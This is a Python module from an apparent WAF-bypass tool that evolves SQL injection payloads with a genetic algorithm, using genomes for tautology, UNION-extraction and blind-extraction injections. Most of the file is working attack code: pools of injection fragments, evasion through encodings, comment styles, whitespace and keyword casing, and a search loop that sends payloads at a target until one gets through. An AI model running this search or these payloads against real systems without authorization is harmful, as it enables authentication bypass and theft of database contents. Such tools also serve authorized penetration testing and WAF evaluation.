"""Structured genetic search using Payload DNA.

Instead of string-level crossover (which produces invalid payloads ~80% of the
time), this module represents each payload as a structured genome with typed
genes. Crossover swaps GENES, not substrings — every offspring is syntactically
valid and meaningfully different from its parents.

Three genome types cover the main SQLi injection patterns:
  - TautologyGenome: `' OR 1=1--` family (auth bypass, tautology injection)
  - UnionGenome:     `' UNION SELECT ...--` family (data extraction)
  - BlindGenome:     `' AND SUBSTR(...)>...--` family (blind extraction)

Usage:
    waffen bypass --strategy dna --max-requests 500 --class "SQL Injection"
"""
from __future__ import annotations

import random
import urllib.parse
from dataclasses import dataclass, field
from typing import Optional

from ..core.oracle import Oracle, Response, THROUGH
from .beam import Finding, SearchResult, finalize_finding
from .scoring import composite_score


# ---------------------------------------------------------------------------
# Gene pools — all valid values per gene
# ---------------------------------------------------------------------------

QUOTES = ["'", '"', "')", "'))", "'))"]
LOGICS = ["OR", "AND", "||", "GLOB", "NOT", "BETWEEN", "IN", "LIKE", "IS"]
TAUTOLOGIES = [
    "1=1", "'a'='a'", "1 LIKE 1", "1 BETWEEN 0 AND 2", "1 IN (1)",
    "EXISTS(SELECT 1)", "IIF(1,1,0)=1", "TYPEOF(1)='integer'",
    "NULLIF(1,2) IS NOT NULL", "'a' GLOB '*'", "2>1", "3!=4",
    "CASE WHEN 1 THEN 1 END=1", "COALESCE(1,0)=1", "LENGTH('a')=1",
]
COMMENTS = ["--", "-- -", "#", "/**/", ";%00", ""]
ENCODINGS = ["none", "url", "double_url", "hex", "unicode"]
WHITESPACES = [" ", "\t", "\n", "/**/", "/*a*/", "%09", "%0a"]
KEYWORD_CASES = ["upper", "lower", "mixed", "alternating"]
NUMBER_FORMS = ["decimal", "hex", "float", "scientific", "char"]

UNION_KWS = ["UNION", "UNION ALL"]
SELECT_KWS = ["SELECT"]
EXTRACTIONS = [
    "version()", "sqlite_version()", "@@version", "user()",
    "current_user", "database()", "DB_NAME()",
]
COLUMN_COUNTS = [1, 2, 3, 4, 5, 6, 7, 8, 10, 12]

BLIND_LOGICS = ["AND", "OR"]
BLIND_FUNCTIONS = ["SUBSTR", "MID", "SUBSTRING", "LEFT"]
BLIND_COMPARISONS = [">", "<", "=", "LIKE", "GLOB", "!="]


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _apply_case(keyword: str, case: str) -> str:
    if case == "lower":
        return keyword.lower()
    if case == "mixed":
        return "".join(c.upper() if i % 2 == 0 else c.lower()
                       for i, c in enumerate(keyword))
    if case == "alternating":
        return "".join(c.lower() if i % 2 == 0 else c.upper()
                       for i, c in enumerate(keyword))
    return keyword.upper()


def _apply_number_form(tautology: str, form: str) -> str:
    if form == "decimal" or "'" in tautology or "(" in tautology:
        return tautology
    try:
        if form == "hex":
            return tautology.replace("1", "0x1").replace("2", "0x2")
        if form == "float":
            return tautology.replace("1", "1.0").replace("2", "2.0")
        if form == "scientific":
            return tautology.replace("1", "1e0").replace("2", "2e0")
        if form == "char":
            return tautology.replace("1", "CHAR(49)").replace("2", "CHAR(50)")
    except Exception:
        pass
    return tautology


def _apply_encoding(payload: str, encoding: str) -> str:
    if encoding == "none":
        return payload
    if encoding == "url":
        return urllib.parse.quote(payload, safe="")
    if encoding == "double_url":
        return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")
    if encoding == "hex":
        return "".join(f"\\x{ord(c):02x}" for c in payload)
    if encoding == "unicode":
        return "".join(f"\\u{ord(c):04x}" for c in payload)
    return payload


# ---------------------------------------------------------------------------
# Genomes
# ---------------------------------------------------------------------------

@dataclass
class TautologyGenome:
    """Genome for tautology-based injection: `' OR 1=1--`."""

    quote: str = "'"
    logic: str = "OR"
    tautology: str = "1=1"
    comment: str = "--"
    encoding: str = "none"
    whitespace: str = " "
    keyword_case: str = "upper"
    number_form: str = "decimal"

    GENE_POOLS = {
        "quote": QUOTES,
        "logic": LOGICS,
        "tautology": TAUTOLOGIES,
        "comment": COMMENTS,
        "encoding": ENCODINGS,
        "whitespace": WHITESPACES,
        "keyword_case": KEYWORD_CASES,
        "number_form": NUMBER_FORMS,
    }

    def to_payload(self) -> str:
        ws = self.whitespace
        q = self.quote
        logic = _apply_case(self.logic, self.keyword_case)
        taut = _apply_number_form(self.tautology, self.number_form)
        comment = self.comment
        raw = f"{q}{ws}{logic}{ws}{taut}{comment}"
        return _apply_encoding(raw, self.encoding)

    def crossover(self, other: "TautologyGenome", rng: random.Random | None = None) -> tuple["TautologyGenome", "TautologyGenome"]:
        rng = rng or random.Random()
        genes = list(self.GENE_POOLS.keys())
        point = rng.randint(1, len(genes) - 1)
        g1, g2 = {}, {}
        for i, gene in enumerate(genes):
            if i < point:
                g1[gene] = getattr(self, gene)
                g2[gene] = getattr(other, gene)
            else:
                g1[gene] = getattr(other, gene)
                g2[gene] = getattr(self, gene)
        return TautologyGenome(**g1), TautologyGenome(**g2)

    def mutate(self, rate: float = 0.15, rng: random.Random | None = None) -> "TautologyGenome":
        rng = rng or random.Random()
        genes = {k: getattr(self, k) for k in self.GENE_POOLS}
        for gene, pool in self.GENE_POOLS.items():
            if rng.random() < rate:
                genes[gene] = rng.choice(pool)
        return TautologyGenome(**genes)

    @classmethod
    def random(cls, rng: random.Random | None = None) -> "TautologyGenome":
        rng = rng or random.Random()
        return cls(**{g: rng.choice(p) for g, p in cls.GENE_POOLS.items()})


@dataclass
class UnionGenome:
    """Genome for UNION-based extraction: `' UNION SELECT 1,2,version()--`."""

    quote: str = "'"
    union_kw: str = "UNION"
    select_kw: str = "SELECT"
    columns: int = 3
    target_col: int = 2
    extraction: str = "version()"
    comment: str = "--"
    encoding: str = "none"
    whitespace: str = " "
    keyword_case: str = "upper"

    GENE_POOLS = {
        "quote": QUOTES,
        "union_kw": UNION_KWS,
        "select_kw": SELECT_KWS,
        "columns": COLUMN_COUNTS,
        "target_col": [0, 1, 2, 3, 4],
        "extraction": EXTRACTIONS,
        "comment": COMMENTS,
        "encoding": ENCODINGS,
        "whitespace": WHITESPACES,
        "keyword_case": KEYWORD_CASES,
    }

    def to_payload(self) -> str:
        ws = self.whitespace
        q = self.quote
        union = _apply_case(self.union_kw, self.keyword_case)
        select = _apply_case(self.select_kw, self.keyword_case)
        tc = min(self.target_col, self.columns - 1)
        cols = []
        for i in range(self.columns):
            cols.append(self.extraction if i == tc else "NULL")
        col_str = ",".join(cols)
        raw = f"{q}{ws}{union}{ws}{select}{ws}{col_str}{self.comment}"
        return _apply_encoding(raw, self.encoding)

    def crossover(self, other: "UnionGenome", rng: random.Random | None = None) -> tuple["UnionGenome", "UnionGenome"]:
        rng = rng or random.Random()
        genes = list(self.GENE_POOLS.keys())
        point = rng.randint(1, len(genes) - 1)
        g1, g2 = {}, {}
        for i, gene in enumerate(genes):
            if i < point:
                g1[gene] = getattr(self, gene)
                g2[gene] = getattr(other, gene)
            else:
                g1[gene] = getattr(other, gene)
                g2[gene] = getattr(self, gene)
        return UnionGenome(**g1), UnionGenome(**g2)

    def mutate(self, rate: float = 0.15, rng: random.Random | None = None) -> "UnionGenome":
        rng = rng or random.Random()
        genes = {k: getattr(self, k) for k in self.GENE_POOLS}
        for gene, pool in self.GENE_POOLS.items():
            if rng.random() < rate:
                genes[gene] = rng.choice(pool)
        return UnionGenome(**genes)

    @classmethod
    def random(cls, rng: random.Random | None = None) -> "UnionGenome":
        rng = rng or random.Random()
        return cls(**{g: rng.choice(p) for g, p in cls.GENE_POOLS.items()})


@dataclass
class BlindGenome:
    """Genome for blind extraction: `' AND SUBSTR(...)>'M'--`."""

    quote: str = "'"
    logic: str = "AND"
    function: str = "SUBSTR"
    comparison: str = ">"
    comment: str = "--"
    encoding: str = "none"
    whitespace: str = " "
    keyword_case: str = "upper"

    GENE_POOLS = {
        "quote": QUOTES,
        "logic": BLIND_LOGICS,
        "function": BLIND_FUNCTIONS,
        "comparison": BLIND_COMPARISONS,
        "comment": COMMENTS,
        "encoding": ENCODINGS,
        "whitespace": WHITESPACES,
        "keyword_case": KEYWORD_CASES,
    }

    def to_payload(self) -> str:
        ws = self.whitespace
        q = self.quote
        logic = _apply_case(self.logic, self.keyword_case)
        fn = _apply_case(self.function, self.keyword_case)
        cmp = self.comparison
        raw = f"{q}{ws}{logic}{ws}{fn}((SELECT 'test'),1,1){cmp}'t'{self.comment}"
        return _apply_encoding(raw, self.encoding)

    def crossover(self, other: "BlindGenome", rng: random.Random | None = None) -> tuple["BlindGenome", "BlindGenome"]:
        rng = rng or random.Random()
        genes = list(self.GENE_POOLS.keys())
        point = rng.randint(1, len(genes) - 1)
        g1, g2 = {}, {}
        for i, gene in enumerate(genes):
            if i < point:
                g1[gene] = getattr(self, gene)
                g2[gene] = getattr(other, gene)
            else:
                g1[gene] = getattr(other, gene)
                g2[gene] = getattr(self, gene)
        return BlindGenome(**g1), BlindGenome(**g2)

    def mutate(self, rate: float = 0.15, rng: random.Random | None = None) -> "BlindGenome":
        rng = rng or random.Random()
        genes = {k: getattr(self, k) for k in self.GENE_POOLS}
        for gene, pool in self.GENE_POOLS.items():
            if rng.random() < rate:
                genes[gene] = rng.choice(pool)
        return BlindGenome(**genes)

    @classmethod
    def random(cls, rng: random.Random | None = None) -> "BlindGenome":
        rng = rng or random.Random()
        return cls(**{g: rng.choice(p) for g, p in cls.GENE_POOLS.items()})


# Type alias for any genome
AnyGenome = TautologyGenome | UnionGenome | BlindGenome
GENOME_TYPES = [TautologyGenome, UnionGenome, BlindGenome]


# ---------------------------------------------------------------------------
# DNA genetic search
# ---------------------------------------------------------------------------

def dna_genetic_search(
    oracle: Oracle,
    seed: str,
    mutators,
    *,
    population_size: int = 30,
    generations: int = 20,
    max_requests: int = 500,
    attack_class: str = "",
    stop_on_first: bool = False,
    verify_fn=None,
    on_event=None,
    on_progress=None,
    concurrency: int = 1,
    **_kw,
) -> SearchResult:
    """Genetic search using structured Payload DNA genomes.

    Every individual in the population is a structured genome that assembles
    into a syntactically valid SQL injection payload. Crossover swaps genes
    (quote style, logic operator, tautology form, etc.) rather than slicing
    random byte positions, so every offspring is structurally valid.
    """
    rng = random.Random()
    result = SearchResult(seed=seed, attack_class=attack_class)

    # Baseline
    baseline = oracle.send(seed)
    result.baseline_verdict = baseline.verdict

    # Initialize population: 1/3 tautology, 1/3 union, 1/3 blind
    population: list[AnyGenome] = []
    third = max(population_size // 3, 2)
    for _ in range(third):
        population.append(TautologyGenome.random(rng))
    for _ in range(third):
        population.append(UnionGenome.random(rng))
    for _ in range(population_size - 2 * third):
        population.append(BlindGenome.random(rng))

    # Try to parse seed into a genome for the first slot
    seed_genome = _parse_seed(seed)
    if seed_genome is not None:
        population[0] = seed_genome

    scored: list[tuple[float, AnyGenome]] = []

    for gen in range(generations):
        if oracle.requests >= max_requests:
            break

        # Evaluate population
        scored = []
        for genome in population:
            if oracle.requests >= max_requests:
                break
            payload = genome.to_payload()
            resp = oracle.send(payload)
            sc = composite_score(resp, baseline, 1)
            scored.append((sc, genome))

            # Check for THROUGH
            if resp.verdict == THROUGH:
                f = Finding(
                    payload=payload,
                    chain=[f"dna:{type(genome).__name__}"],
                    code=resp.code,
                    attack_class=attack_class,
                )
                is_real = finalize_finding(f, verify_fn)
                result.findings.append(f)
                if on_event:
                    on_event("found", chain=f.chain, code=resp.code,
                             payload=payload[:60], depth=gen,
                             verified=f.verified)
                if stop_on_first and is_real:
                    result.requests = oracle.requests
                    return result

        if not scored:
            break

        # Sort by fitness (descending)
        scored.sort(key=lambda x: x[0], reverse=True)

        # Progress callback
        if on_progress:
            best_sc = scored[0][0] if scored else 0.0
            on_progress(
                depth=gen, max_depth=generations,
                requests=oracle.requests, budget=max_requests,
                throughs=len(result.findings),
                best_score=best_sc,
                frontier_size=len(population),
            )

        # Selection: top 50%
        survivors = [g for _, g in scored[:max(2, len(scored) // 2)]]

        # Elitism: keep top 2 unchanged
        new_population: list[AnyGenome] = list(survivors[:2])

        # Crossover to fill population
        while len(new_population) < population_size:
            p1 = rng.choice(survivors)
            p2 = rng.choice(survivors)
            if type(p1) is type(p2):
                c1, c2 = p1.crossover(p2, rng)
                new_population.append(c1)
                if len(new_population) < population_size:
                    new_population.append(c2)
            else:
                # Different genome types — mutate each instead
                new_population.append(p1.mutate(rate=0.3, rng=rng))
                if len(new_population) < population_size:
                    new_population.append(p2.mutate(rate=0.3, rng=rng))

        # Mutation
        population = [
            g.mutate(rate=0.15, rng=rng) if i >= 2 else g
            for i, g in enumerate(new_population)
        ]

    result.requests = oracle.requests
    return result


def _parse_seed(seed: str) -> AnyGenome | None:
    """Best-effort parse of a seed payload string into a genome."""
    s = seed.strip()
    if not s:
        return None

    # Detect quote
    quote = "'"
    for q in ["'))", "')", "'", '"']:
        if s.startswith(q):
            quote = q
            s = s[len(q):].lstrip()
            break

    # Detect comment
    comment = ""
    for c in ["-- -", "--", "#", "/**/", ";%00"]:
        if s.endswith(c):
            comment = c
            s = s[:-len(c)].rstrip()
            break

    upper = s.upper()

    # Detect UNION SELECT
    if "UNION" in upper and "SELECT" in upper:
        return UnionGenome(quote=quote, comment=comment)

    # Detect blind patterns
    for fn in ["SUBSTR", "MID", "SUBSTRING", "LEFT"]:
        if fn in upper:
            return BlindGenome(quote=quote, comment=comment, function=fn)

    # Default: tautology
    logic = "OR"
    for kw in ["OR", "AND", "GLOB", "LIKE", "BETWEEN", "IN", "IS", "NOT", "||"]:
        if kw in upper:
            logic = kw
            break

    tautology = "1=1"
    for t in TAUTOLOGIES:
        if t.upper() in upper or t in s:
            tautology = t
            break

    return TautologyGenome(quote=quote, logic=logic, tautology=tautology, comment=comment)
